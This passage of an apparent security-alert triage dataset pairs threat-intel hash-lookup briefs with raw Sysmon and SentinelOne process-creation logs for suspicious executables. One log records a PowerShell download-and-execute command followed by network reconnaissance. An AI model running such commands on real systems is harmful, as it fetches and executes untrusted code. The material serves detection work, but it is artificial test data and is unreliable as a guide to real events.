#g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-09-28 04:34:33.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "12": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activity4848.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\4848.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=DD879217D6270CE10527C1F4752E2602,SHA256=A406A3C1474A57C62F3DBD56AA15D5D732E6A0FE8BBFD7BCE9425B132204DA8B,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\4848.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"newrock.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4968\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2308,\"ProcessId\":\"10148\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379908,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":704,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-14 05:32:25.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "13": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activity2210231586.exe launched by cmd.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DA1E9AA523AA8EE2CBBED75292F9C7C8,SHA256=E16A60A10EBACD0B8AF5320E9582ABD6B1EC86B459BD35FD4E69BD37807F4A47,IMPHASH=18690DF0ED1BE01972DCB3DC78C42692\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-2F94-647F-C9CC-030000000000}\",\"LogonId\":\"0x3ccc9\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /c start /I \\\"\\\" \\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\SysWOW64\\\\cmd.exe\",\"ParentProcessGuid\":\"{C784477D-A42A-6517-2606-000000004400}\",\"ParentProcessId\":\"3380\",\"ProcessGuid\":\"{C784477D-A42A-6517-2806-000000004400}\",\"ProcessID\":2296,\"ProcessId\":\"3080\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366193,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":364,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-04 05:32:16.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\SysWOW64\\cmd.exe"
        ]
    },
    "14": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1730266301297,\"meta\":{\"traceId\":\"01GE20GAECTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17302663012915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1730266301297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"powershell.exe -executionpolicy remotesigned -File Get-DataInfo.ps1 method\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17302663012975951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1730266301297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "15": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityAvl.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=4064209A8AB2F313551CBB57AC1FCD94,SHA256=0000A30F08A3BC2D09C7A03A12A03C85BC6F01F264652170C49826DD944DC018,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"Avl.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4967\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2307,\"ProcessId\":\"10147\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379907,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":707,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-10 05:32:23.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "16": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-21 05:32:23.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "17": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□'□#henry-mellott-windows-pc.corp.local\"□*f\"d□□46522□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:46522"
        ]
    },
    "18": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1731216674299,\"meta\":{\"traceId\":\"01GE20GABCTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17312166742915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1731216674299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17312166742995951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1731216674299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "19": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1728707496297,\"meta\":{\"traceId\":\"01GE20GAECTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17287074962915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1728707496297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"powershell.exe -executionpolicy remotesigned -File Get-DataInfo.ps1 